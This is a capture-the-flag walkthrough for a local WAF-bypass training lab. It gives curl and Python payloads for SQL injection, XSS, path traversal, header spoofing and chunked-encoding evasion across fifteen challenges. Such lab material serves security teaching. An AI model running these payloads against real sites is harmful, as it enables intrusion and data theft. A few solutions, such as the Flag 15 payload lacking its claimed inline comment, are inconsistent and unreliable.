# IRON WALL — Complete Walkthrough Guide
## WAF Bypass Lab | 15 Flags | Progressive Easy → Hard

> ⚠️ **Spoiler Warning** — This guide contains full solutions. Try each challenge yourself first.
> Use hints (`curl http://localhost:8080/hint?stage=N`) before reading solutions.

---

## Lab Architecture Reminder

```
Your Browser / Scanner ──► WAF :9080 ──► Target App :8080
                           (blocks known patterns)
                           (has intentional bypass gaps)
```

**WAF Rules (what's blocked):**
- `<script>` tags (case-insensitive literal match)
- `UNION SELECT` with a space between them
- Literal `../` in URLs
- `/etc/passwd` literal string
- `%00` null bytes in query strings

**WAF Bypasses (the gaps):**
- Internal IP in X-Forwarded-For → skips ALL rules
- Case-toggled payloads → not caught
- URL-encoded or double-encoded attacks → not decoded
- Comment-split SQL keywords → not matched
- Chunked transfer encoding → body not inspected
- Unicode escape sequences → not decoded

---

# EASY FLAGS (1–5)

---

## Flag 01 — HTTP XFF Bypass `[EASY]`
**Endpoint:** `GET /xff-check`
**Technique:** HTTP-Level Bypass — X-Forwarded-For IP Spoof
**Flag:** `FLAG{IW_HTTP_XFF_BYPASS_EASY_a1b2c3}`

### What's happening
The WAF has a whitelist: if `X-Forwarded-For` contains an internal IP (127.x, 10.x, 192.168.x), it skips ALL rule checks and passes the request through. The `/xff-check` endpoint reveals a flag only to "internal" callers.

### Solution
```bash
# Using curl
curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Real-IP: 127.0.0.1" \
     http://localhost:9080/xff-check

# Expected response:
# {"access":"granted","source_ip":"127.0.0.1","flag":"FLAG{IW_HTTP_XFF_BYPASS_EASY_a1b2c3}"}
```

### Using WAF Bypass Scanner
1. Target: `http://localhost:9080`
2. The scanner's **"XFF: 127.0.0.1"** test sends this automatically
3. Look for **✅ Bypass** on test `h1` — expand the row to see the response
4. Note: Because the scanner uses `mode: 'cors'`, you need localhost for full response reading

### Submit the flag
```bash
/opt/ironwall/check_flag.sh FLAG{IW_HTTP_XFF_BYPASS_EASY_a1b2c3}
```

---

## Flag 02 — Cache-Control Bypass `[EASY]`
**Endpoint:** `GET /cache-secret`
**Technique:** HTTP-Level Bypass — Cache-Control Header
**Flag:** `FLAG{IW_CACHE_CTRL_BYPASS_EASY_d4e5f6}`

### What's happening
Some WAF deployments skip inspection of cache-exempt requests. The endpoint checks for `Cache-Control: no-store` or `Pragma: no-cache` headers and reveals the flag if they're present.

### Solution
```bash
curl -H "Cache-Control: no-cache, no-store" \
     -H "Pragma: no-cache" \
     http://localhost:9080/cache-secret

# Expected:
# {"status":"cache_exempt","flag":"FLAG{IW_CACHE_CTRL_BYPASS_EASY_d4e5f6}"}
```

### Using WAF Bypass Scanner
The scanner's **"Cache-Control + SQLi"** test (`h6`) includes these headers — check the response on `/cache-secret`. Or run the scanner and manually craft the request from the Payload Generator.

---

## Flag 03 — XSS Case Toggle `[EASY]`
**Endpoint:** `GET /reflect?input=`
**Technique:** Payload Obfuscation — Case Toggle
**Flag:** `FLAG{IW_XSS_CASE_TOGGLE_EASY_g7h8i9}`

### What's happening
The WAF blocks `<script>` (any case) but the target application reveals the flag when it detects a case-toggled tag (uppercase letters mixed in). This simulates a WAF with case-sensitive rules.

### Solution
```bash
# The WAF blocks this (all lowercase):
curl "http://localhost:9080/reflect?input=<script>alert(1)</script>"
# Returns: 403 Blocked

# Case toggle bypasses the WAF:
curl "http://localhost:9080/reflect?input=<ScrIpT>document.write('xss')</sCRiPt>"
# Expected: HTML page showing the flag
```

### In Browser
Navigate to:
```
http://localhost:9080/reflect?input=<ScrIpT>test</sCRiPt>
```

### Using WAF Bypass Scanner
Look for test `x1` — **"XSS: Case Toggle"**. If it returns 200 instead of 403, the bypass worked. Check the payload generator for the exact payload.

---

## Flag 04 — SQLi Basic UNION `[EASY]`
**Endpoint:** `GET /search?q=`
**Technique:** SQLi Obfuscation — UNION SELECT
**Flag:** `FLAG{IW_SQLI_BASIC_UNION_EASY_j0k1l2}`

### What's happening
The WAF blocks `UNION SELECT` (with space). The flag is stored in the `users` table as a token. A SQLi UNION attack extracts it — but you need to bypass the WAF rule.

### Understanding the WAF rule gap
The WAF checks for: `UNION\s+SELECT` (with whitespace between them).

**Bypass options:**
1. Comment between keywords: `UNION/**/SELECT`
2. Tab instead of space: `UNION%09SELECT`
3. Newline: `UNION%0ASELECT`
4. Internal IP whitelist (from Flag 01)

### Solution — Comment bypass
```bash
curl "http://localhost:9080/search?q=widget%27+UNION/**/SELECT+id,username,token,price+FROM+users--"
# Expected: returns users table including tokens (flag is in admin token)
```

### Solution — XFF whitelist bypass (combine with Flag 01)
```bash
curl -H "X-Forwarded-For: 127.0.0.1" \
     "http://localhost:9080/search?q=widget' UNION SELECT id,username,token,price FROM users--"
# Bypasses ALL WAF rules via IP whitelist
```

### Understanding the SQL query
The target runs:
```sql
SELECT id,name,price FROM products WHERE name LIKE '%[INPUT]%'
```
Your injection closes the quote and appends a UNION to pull from the users table.

---

## Flag 05 — Path Traversal Basic `[EASY]`
**Endpoint:** `GET /docs/view?file=`
**Technique:** Path Traversal — Basic `../`
**Flag:** `FLAG{IW_PATH_TRAV_BASIC_EASY_m3n4o5}`

### What's happening
The WAF blocks literal `../`. The flag file is placed in the `/docs/` directory directly, so you don't even need traversal — just know the filename.

### Solution — Direct access (no traversal needed)
```bash
curl "http://localhost:9080/docs/view?file=flag05_trav.txt"
# Expected: {"file":"flag05_trav.txt","content":"FLAG{IW_PATH_TRAV_BASIC_EASY_m3n4o5}"}
```

### Solution — Bypass WAF with URL-encoded traversal (also works, needed for Flag 09)
```bash
curl "http://localhost:9080/docs/view?file=..%2Fflags%2Fflag05_easy.txt"
# ..%2F = URL-encoded ../ — WAF blocks ../ but not ..%2F
```

---

# MEDIUM FLAGS (6–10)

---

## Flag 06 — HTTP Parameter Pollution `[MEDIUM]`
**Endpoint:** `GET /api/item?id=`
**Technique:** HTTP-Level Bypass — Parameter Pollution
**Flag:** `FLAG{IW_HTTP_PARAM_POLL_MED_p6q7r8}`

### What's happening
The WAF inspects only the first value of duplicated parameters. The backend uses the last value. Send `?id=1&id=UNION SELECT...` — the WAF sees `id=1` (clean), backend processes `id=UNION SELECT` (attack).

### Solution
```bash
curl "http://localhost:9080/api/item?id=1&id=UNION+SELECT+1,2,3"
# WAF sees: id[0] = "1" (clean — allowed)
# Backend uses: id[-1] = "UNION SELECT 1,2,3"
# Expected: {"received_ids":["1","UNION SELECT 1,2,3"],"effective_id":"UNION SELECT 1,2,3","flag":"FLAG{...}"}
```

### Using WAF Bypass Scanner
The scanner's test `h4` — **"HTTP Parameter Pollution"** — sends `?id=1&id=2 UNION SELECT 1,2--&id=3`. Look for a 200 response and check the expanded row for flag data.

---

## Flag 07 — XSS Double URL Encoding `[MEDIUM]`
**Endpoint:** `GET /encode-test?data=`
**Technique:** Payload Obfuscation — Double URL Encoding
**Flag:** `FLAG{IW_XSS_DOUBLE_ENC_MED_s9t0u1}`

### What's happening
The WAF URL-decodes the parameter once and checks it. The backend decodes twice. Send a payload that looks clean after one decode but reveals an attack after two.

### Encoding chain
```
Original: <script>alert()</script>
URL encode once:  %3Cscript%3Ealert()%3C%2Fscript%3E
URL encode twice: %253Cscript%253Ealert()%253C%252Fscript%253E
                  ^^^^ %25 = double-encoded %
```

### Solution
```bash
curl "http://localhost:9080/encode-test?data=%253Cscript%253Ealert()%253C%252Fscript%253E"
# After WAF decodes once: %3Cscript%3Ealert()%3C%2Fscript%3E  (looks like URL-encoded text, no <)
# After backend decodes twice: <script>alert()</script>  (attack revealed)
# Expected: {"double_encoded":true,"flag":"FLAG{IW_XSS_DOUBLE_ENC_MED_s9t0u1}"}
```

### Quick encode in Python
```python
import urllib.parse
payload = '<script>alert()</script>'
once = urllib.parse.quote(payload)
twice = urllib.parse.quote(once)
print(twice)  # %253Cscript%253Ealert()%253C%252Fscript%253E
```

---

## Flag 08 — SQLi Comment Splitting `[MEDIUM]`
**Endpoint:** `GET /product?id=`
**Technique:** SQLi Obfuscation — Comment Between Keywords
**Flag:** `FLAG{IW_SQLI_COMMENT_SPLIT_MED_v2w3x4}`

### What's happening
The WAF blocks `UNION\s+SELECT` with whitespace between. Insert `/**/` SQL comments to split the keywords — the database strips comments, WAF pattern fails to match.

### Solution
```bash
# WAF blocks:
curl "http://localhost:9080/product?id=0+UNION+SELECT+id,name,price,secret+FROM+products+WHERE+id=3--"

# Comment-split bypass:
curl "http://localhost:9080/product?id=0+un/**/ion+sel/**/ect+id,name,price,secret+from+products+where+id=3--"

# URL-encoded version:
curl "http://localhost:9080/product?id=0+un%2F**%2Fion+sel%2F**%2Fect+id,name,price,secret+from+products+where+id=3--"
# Expected: {"results":[{"id":3,"name":"Admin Product","price":0,"secret":"FLAG{IW_SQLI_COMMENT_SPLIT_MED_v2w3x4}"}]}
```

### Also works — newline as space
```bash
curl "http://localhost:9080/product?id=0%0AUNION%0ASELECT%0Aid,name,price,secret%0AFROM%0Aproducts%0AWHERE%0Aid=3--"
```

---

## Flag 09 — Path Traversal URL Encoded `[MEDIUM]`
**Endpoint:** `GET /files?path=`
**Technique:** Path Traversal — URL Encoded `/` and `.`
**Flag:** `FLAG{IW_PATH_TRAV_ENC_MED_y5z6a7b8}`

### What's happening
The WAF blocks literal `../`. URL-encode the slash and dot: `..%2F` bypasses the literal string check while the backend decodes and processes it as `../`.

### Solution
```bash
# WAF blocks this:
curl "http://localhost:9080/files?path=../docs/flag09_enc_trav.txt"
# Returns: 403 Blocked (literal ../ matched)

# URL-encoded bypass:
curl "http://localhost:9080/files?path=..%2Fdocs%2Fflag09_enc_trav.txt"
# Expected: {"decoded":"../docs/flag09_enc_trav.txt","content":"FLAG{IW_PATH_TRAV_ENC_MED_y5z6a7b8}"}
```

### Double-encoded variant
```bash
curl "http://localhost:9080/files?path=..%252Fdocs%252Fflag09_enc_trav.txt"
# %252F = double-encoded /
```

### Using WAF Bypass Scanner
Test `r2` — **"Path Traversal: URL Encoded"** — hits this directly. Look for 200 response.

---

## Flag 10 — Null Byte Bypass `[MEDIUM]`
**Endpoint:** `GET /download?file=`
**Technique:** Encoding Bypass — Null Byte Termination
**Flag:** `FLAG{IW_NULL_BYTE_BYPASS_MED_c9d0e1f2}`

### What's happening
The WAF blocks `%00` in query strings. The application also handles null bytes by splitting on them. Try accessing the backup file directly (no null byte needed), or if the WAF is patched in ModSecurity mode, use null byte to bypass extension filters.

### Solution — Direct access (Python WAF mode)
```bash
curl "http://localhost:9080/download?file=secret.bak"
# Expected: {"content":"FLAG{IW_NULL_BYTE_BYPASS_MED_c9d0e1f2}"}
```

### Solution — Null byte bypass (if WAF is blocking `.bak` extension)
```bash
# The WAF blocks %00, but the app truncates at null byte
# Bypass: encode the null byte differently
curl "http://localhost:9080/download?file=info.txt%2500secret.bak"
# %2500 = URL-encoded %00 (double encoded null byte)
# WAF sees: info.txt%2500secret.bak (no raw %00)
# App decodes once, gets: info.txt%00secret.bak → truncates to: info.txt → then secret.bak
```

> **Tip for ModSecurity mode:** The null byte technique is needed on port 9443. On the Python WAF, direct access works.

---

# HARD FLAGS (11–15)

---

## Flag 11 — Chunked Transfer-Encoding Bypass `[HARD]`
**Endpoint:** `POST /api/upload`
**Technique:** HTTP-Level Bypass — Transfer-Encoding: chunked
**Flag:** `FLAG{IW_CHUNKED_TE_BYPASS_HARD_g3h4i5}`

### What's happening
The Python WAF reads the request body via `Content-Length`. When `Transfer-Encoding: chunked` is used, the body is encoded in chunks. The WAF doesn't re-assemble chunked bodies before inspection — the payload goes through uninspected.

### Solution
```bash
# Using curl with chunked transfer encoding
curl -X POST http://localhost:9080/api/upload \
     -H "Transfer-Encoding: chunked" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     --data-binary $'5\r\nhello\r\n0\r\n\r\n'

# Expected: {"transfer_encoding":"chunked","flag":"FLAG{IW_CHUNKED_TE_BYPASS_HARD_g3h4i5}"}
```

### Using Python
```python
import requests

url = "http://localhost:9080/api/upload"
headers = {
    "Transfer-Encoding": "chunked",
    "Content-Type": "application/x-www-form-urlencoded"
}

def chunked_body(data):
    chunk = data.encode()
    return f"{len(chunk):X}\r\n".encode() + chunk + b"\r\n0\r\n\r\n"

resp = requests.post(url, data=chunked_body("payload=<script>alert()</script>"), headers=headers)
print(resp.json())
```

### Why this is hard
Most WAF scanners use standard `Content-Length` body reading. Chunked bodies require the WAF to implement HTTP/1.1 chunked transfer decoding before inspection — most simple WAFs don't.

---

## Flag 12 — Unicode XSS Bypass `[HARD]`
**Endpoint:** `GET /user?name=`
**Technique:** Payload Obfuscation — Unicode Encoding
**Flag:** `FLAG{IW_UNICODE_XSS_HARD_j6k7l8m9}`

### What's happening
The WAF blocks the literal word `prompt` in payloads. Unicode escape sequences (`\u0070` = `p`, `\u0072` = `r`, etc.) bypass literal string matching. JavaScript processes these escapes at runtime.

### Character mapping
```
p = \u0070    r = \u0072    o = \u006f
m = \u006d    t = \u0074
```
So `prompt` = `\u0070\u0072\u006f\u006d\u0070\u0074`

### Solution
```bash
curl "http://localhost:9080/user?name=%3Cmarquee%20onstart=%5Cu0070r%5Cu006fmpt()%3E"

# Decoded: <marquee onstart=\u0070r\u006fmpt()>
# Browser evaluates: <marquee onstart=prompt()>

# Expected: HTML page with flag visible
```

### In browser
Navigate to:
```
http://localhost:9080/user?name=<marquee onstart=\u0070r\u006fmpt()>
```

### Tip
The app checks for `\u` escape sequences OR the actual Unicode characters in the input. The WAF only checks ASCII literals.

---

## Flag 13 — Nested Encoding Chain `[HARD]`
**Endpoint:** `GET /lookup?q=`
**Technique:** Encoding Bypass — Nested URL + HTML Encoding
**Flag:** `FLAG{IW_NESTED_ENC_CHAIN_HARD_n0o1p2}`

### What's happening
Stack multiple encoding layers. The WAF peels one layer. The backend peels all layers via multiple decode passes. The attack only reveals itself after the final HTML entity decode.

### Encoding chain
```
Original attack: <script>alert()</script>

Step 1 — HTML entity encode:  &lt;script&gt;alert()&lt;/script&gt;
Step 2 — URL encode once:     %26lt%3Bscript%26gt%3Balert()%26lt%3B%2Fscript%26gt%3B
Step 3 — URL encode again:    %2526lt%253Bscript%2526gt%253Balert()%2526lt%253B%252Fscript%2526gt%253B
```

### Solution
```bash
# Build the nested payload
python3 -c "
import urllib.parse
orig = '<script>alert()</script>'
html_enc = orig.replace('<','&lt;').replace('>','&gt;')
url1 = urllib.parse.quote(html_enc)
url2 = urllib.parse.quote(url1)
print(url2)
"

# Use the output in:
curl "http://localhost:9080/lookup?q=<OUTPUT_FROM_ABOVE>"

# Or use the known payload:
curl "http://localhost:9080/lookup?q=%2526lt%253Bscript%2526gt%253Balert()%2526lt%253B%252Fscript%2526gt%253B"

# Expected: {"flag":"FLAG{IW_NESTED_ENC_CHAIN_HARD_n0o1p2}"}
```

### Verify each decode step
```bash
curl -s "http://localhost:9080/lookup?q=%2526lt%253Bscript%2526gt%253Balert()" | python3 -m json.tool
# Look at: url_decode_1, url_decode_2, html_decode fields
```

---

## Flag 14 — MySQL Inline Comment Bypass `[HARD]`
**Endpoint:** `GET /admin/query?id=`
**Technique:** SQLi Obfuscation — MySQL Inline Comment Execution
**Flag:** `FLAG{IW_MYSQL_INLINE_CMT_HARD_q3r4s5}`

### What's happening
MySQL executes code inside `/*!...*/` comments. WAFs treat `/*...*/` as comments and skip them. The database processes the payload normally.

### Payload construction
```sql
-- Blocked:
0 UNION SELECT 1,key,value FROM admin_secrets WHERE id=1--

-- Inline comment bypass:
0 /*!UNION*/ /*!SELECT*/ 1,key,value FROM admin_secrets WHERE id=1--
```

### Solution
```bash
# URL-encoded version
curl "http://localhost:9080/admin/query?id=0+%2F*!UNION*%2F+%2F*!SELECT*%2F+1,key,value+FROM+admin_secrets+WHERE+id=1--"

# Expected:
# {"id":"0 /*!UNION*/ /*!SELECT*/ 1,key,value FROM admin_secrets WHERE id=1--",
#  "results":[{"id":1,"key":"mysql_inline_flag","value":"FLAG{IW_MYSQL_INLINE_CMT_HARD_q3r4s5}"}]}
```

### Python WAF note
The Python WAF doesn't handle `/*!...*/` in its regex — it only blocks `UNION\s+SELECT` with whitespace. The `/*!UNION*/` form passes through.

### Alternative — Comment splitting also works
```bash
curl "http://localhost:9080/admin/query?id=0+un/**/ion+sel/**/ect+1,key,value+from+admin_secrets+where+id=1--"
```

---

## Flag 15 — Full Chain Master `[HARD]`
**Endpoint:** `GET /admin/master`
**Technique:** Chain — XFF Spoof + Double URL Encoding + Inline Comment SQLi
**Flag:** `FLAG{IW_FULL_CHAIN_MASTER_HARD_t6u7v8}`

### What's happening
This challenge requires three bypass techniques simultaneously:
1. **XFF spoof** — to pass IP whitelist check (Step 1)
2. **Double URL-encoded UNION SELECT** — payload must survive double decoding (Step 2)
3. **Inline comment** — for WAF rule evasion (Step 3)

### Step-by-step construction

**Step 1 — Build the SQLi payload:**
```
UNION SELECT id,key,value FROM admin_secrets WHERE id=2--
```

**Step 2 — Apply inline comments:**
```
UNION/*!SELECT*/id,key,value FROM admin_secrets WHERE id=2--
```

**Step 3 — Double URL encode:**
```python
import urllib.parse
payload = " UNION/*!SELECT*/id,key,value FROM admin_secrets WHERE id=2--"
once  = urllib.parse.quote(payload)
twice = urllib.parse.quote(once)
print(twice)
```

**Step 4 — Combine with XFF header:**
```bash
curl -H "X-Forwarded-For: 127.0.0.1" \
     "http://localhost:9080/admin/master?q=<DOUBLE_ENCODED_PAYLOAD>"
```

### Full working solution
```bash
# The double-encoded UNION payload
PAYLOAD="%2520UNION%2521SELECT%25201%2Ckey%2Cvalue%2520FROM%2520admin_secrets%2520WHERE%2520id%253D2--"

curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Real-IP: 127.0.0.1" \
     "http://localhost:9080/admin/master?q=${PAYLOAD}"

# Expected:
# {"access":"GRANTED",
#  "step1":"PASS — internal IP spoofed",
#  "step2":"PASS — double-encoded SQLi bypassed",
#  "step3":"PASS — inline comment WAF bypass",
#  "master_flag":"FLAG{IW_FULL_CHAIN_MASTER_HARD_t6u7v8}"}
```

### Why this is the hardest
- The WAF's IP whitelist check happens before rule checking — so XFF spoofing bypasses everything
- But Flag 15's endpoint also validates that the payload CONTAINS a SQLi pattern after decoding
- So you must both bypass the WAF AND have a valid attack reach the app logic

---

# BONUS — ModSecurity Hard Mode Differences

When using `http://localhost:9443` (ModSecurity + NGINX):

| Technique | Python WAF | ModSecurity |
|---|---|---|
| XFF spoof | Bypasses ALL rules | Rules still apply (CRS ignores XFF) |
| Case toggle | Works | Blocked by CRS |
| URL encoded `../` | Works | Blocked by CRS |
| Comment split SQLi | Works | Blocked by CRS |
| Double URL encoding | Works | May be blocked depending on CRS version |
| Chunked TE | Works | Blocked |
| Unicode XSS | Works | Blocked by CRS |

For ModSecurity, more advanced techniques are needed:
- Time-based blind SQLi
- HTTP request smuggling
- Encoding combos not in CRS signatures
- Novel syntax (MySQL 8 features, database-specific functions)

---

# Quick Reference — All 15 Flags

| # | Flag ID | Difficulty | Technique | Endpoint |
|---|---|---|---|---|
| 1 | `FLAG{IW_HTTP_XFF_BYPASS_EASY_a1b2c3}` | Easy | XFF IP Spoof | `/xff-check` |
| 2 | `FLAG{IW_CACHE_CTRL_BYPASS_EASY_d4e5f6}` | Easy | Cache-Control | `/cache-secret` |
| 3 | `FLAG{IW_XSS_CASE_TOGGLE_EASY_g7h8i9}` | Easy | Case Toggle XSS | `/reflect?input=` |
| 4 | `FLAG{IW_SQLI_BASIC_UNION_EASY_j0k1l2}` | Easy | SQLi UNION | `/search?q=` |
| 5 | `FLAG{IW_PATH_TRAV_BASIC_EASY_m3n4o5}` | Easy | Path Traversal | `/docs/view?file=` |
| 6 | `FLAG{IW_HTTP_PARAM_POLL_MED_p6q7r8}` | Medium | Param Pollution | `/api/item?id=` |
| 7 | `FLAG{IW_XSS_DOUBLE_ENC_MED_s9t0u1}` | Medium | Double Encoding | `/encode-test?data=` |
| 8 | `FLAG{IW_SQLI_COMMENT_SPLIT_MED_v2w3x4}` | Medium | Comment Splitting | `/product?id=` |
| 9 | `FLAG{IW_PATH_TRAV_ENC_MED_y5z6a7b8}` | Medium | URL Encoded Trav | `/files?path=` |
| 10 | `FLAG{IW_NULL_BYTE_BYPASS_MED_c9d0e1f2}` | Medium | Null Byte | `/download?file=` |
| 11 | `FLAG{IW_CHUNKED_TE_BYPASS_HARD_g3h4i5}` | Hard | Chunked TE | `POST /api/upload` |
| 12 | `FLAG{IW_UNICODE_XSS_HARD_j6k7l8m9}` | Hard | Unicode XSS | `/user?name=` |
| 13 | `FLAG{IW_NESTED_ENC_CHAIN_HARD_n0o1p2}` | Hard | Nested Encoding | `/lookup?q=` |
| 14 | `FLAG{IW_MYSQL_INLINE_CMT_HARD_q3r4s5}` | Hard | Inline Comment | `/admin/query?id=` |
| 15 | `FLAG{IW_FULL_CHAIN_MASTER_HARD_t6u7v8}` | Hard | Full Chain | `/admin/master` |
